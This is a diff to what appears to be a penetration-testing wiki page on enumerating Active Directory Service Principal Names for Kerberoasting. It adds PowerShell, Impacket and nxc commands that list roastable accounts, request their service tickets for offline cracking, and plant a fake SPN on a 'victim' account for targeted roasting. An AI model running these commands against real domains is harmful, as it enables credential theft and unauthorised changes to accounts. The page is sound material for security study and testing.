@@ -48,15 +48,22 @@ entire [[kerberoasting]] primitive — and it's why SPNs are high-value.
 ## Enumeration (the first step of Kerberoasting)
 
 ```powershell
-# PowerView — list accounts with SPNs (the Kerberoast candidate list)
-Get-SPN -Types MSSQLSvc,MySQL,Oracle,PostgreSQL,SMTP,HTTP | Select-Object ObjectName,ServicePrincipalName
+setspn.exe -T corp.local -Q */*                 # native, no tooling: every SPN in the domain
+Get-DomainUser -SPN | select samaccountname,serviceprincipalname   # PowerView: USER SPNs = the roast targets
+Get-DomainComputer -SPN | select name,serviceprincipalname          # computer SPNs = service inventory
+# Register a fake SPN on a user you can write, to force it roastable, then remove:
+Set-DomainObject -Identity victim -Set @{serviceprincipalname='fake/x'}   # targeted roast -> [[targeted-roasting]]
+Set-DomainObject -Identity victim -Clear serviceprincipalname             # revert
 ```
 ```bash
-# Impacket — the canonical Kerberoast enumeration (requests TGSs)
-GetUserSPNs.py -dc-ip <dc> corp.local/<user> -request
+GetUserSPNs.py -dc-ip <dc> corp.local/user:pass                 # list SPN accounts
+GetUserSPNs.py -dc-ip <dc> corp.local/user:pass -request        # ...and roast them all
+GetUserSPNs.py -dc-ip <dc> corp.local/user:pass -request-user svc_sql   # roast just one (quieter)
+nxc ldap <dc> -u user -p pass --kerberoasting out.txt           # nxc built-in
 ```
 Every account in that output is a **Kerberoast target** — request its TGS and
-crack it. See [[kerberoasting]] for the full request + crack flow.
+crack it. See [[kerberoasting]] for the full request + crack flow, and
+[[ldap]] for the raw `(servicePrincipalName=*)` filter.
 
 ## Why it matters to an attacker
 
